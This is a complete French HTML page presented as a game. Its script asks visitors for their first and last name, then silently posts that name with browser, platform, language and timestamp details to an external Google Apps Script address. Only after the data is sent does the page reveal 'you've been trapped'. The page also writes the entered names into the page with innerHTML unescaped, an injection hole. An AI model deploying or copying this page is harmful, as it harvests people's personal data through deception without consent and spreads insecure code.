<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Jeu - Tu es tombé dans le piège</title>
  <style>
    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: #1a1a1a;
      color: #fff;
      text-align: center;
      padding: 30px;
    }
    h1, h2 {
      color: #00e676;
    }
    .form-container {
      margin-top: 30px;
    }
    .input-field {
      padding: 12px;
      margin: 10px;
      width: 260px;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      background: #333;
      color: #fff;
    }
    .btn {
      padding: 12px 28px;
      background-color: #00e676;
      color: #000;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      transition: background-color 0.3s ease;
    }
    .btn:hover {
      background-color: #00c853;
    }
    .info-display {
      display: none;
      margin-top: 40px;
      padding: 20px;
      background-color: #212121;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,255,0,0.3);
      animation: fadeIn 1s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    .surprise {
      font-size: 2em;
      color: #ff1744;
      margin-top: 20px;
      animation: shake 0.6s ease-in-out;
    }
    @keyframes shake {
      0% { transform: translate(0); }
      25% { transform: translateX(-5px); }
      50% { transform: translateX(5px); }
      75% { transform: translateX(-5px); }
      100% { transform: translateX(0); }
    }
  </style>
</head>
<body>
  <h1>Bienvenue au jeu !</h1>
  <p>Entre ton prénom et ton nom pour participer…</p>

  <div class="form-container">
    <input type="text" id="firstname" class="input-field" placeholder="Prénom" required />
    <input type="text" id="lastname" class="input-field" placeholder="Nom" required />
    <button class="btn" id="submitBtn">Jouer</button>
  </div>

  <div class="info-display" id="infoDisplay">
    <div class="surprise">💥 SURPRISE ! 💥</div>
    <h2>Tu viens de te faire piéger !</h2>
    <p>Voici les infos qu’on a captées sur toi :</p>
    <p id="userInfo"></p>
  </div>

  <script>
    document.getElementById('submitBtn').addEventListener('click', () => {
      const firstname = document.getElementById('firstname').value.trim();
      const lastname = document.getElementById('lastname').value.trim();

      if (firstname && lastname) {
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const ip = "Inconnue"; // À enrichir si tu veux ajouter un appel API
        const timestamp = new Date().toISOString();

        fetch("https://script.google.com/macros/s/AKfycbzV3RWeBzUKNkYQJ-kvLRt2O6g-rPeWpjzFndALKpUsk0C5SontanTseTVm37lxFHR0/exec", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            firstname,
            lastname,
            id: "gotcha",
            ip,
            userAgent,
            platform,
            language,
            timestamp
          })
        })
        .then(res => res.json())
        .then(data => {
          const userInfoHTML = `
            👤 Nom : ${lastname} <br>
            👤 Prénom : ${firstname} <br>
            🌐 IP : ${ip} <br>
            🧠 Navigateur : ${userAgent} <br>
            💻 Plateforme : ${platform} <br>
            🗣️ Langue : ${language} <br>
            🕒 Date/Heure : ${timestamp}
          `;
          document.getElementById("userInfo").innerHTML = userInfoHTML;
          document.getElementById("infoDisplay").style.display = "block";
        })
        .catch(err => {
          alert("Oups, une erreur est survenue !");
          console.error(err);
        });
      } else {
        alert("Merci de bien remplir les deux champs !");
      }
    });
  </script>
</body>
</html>
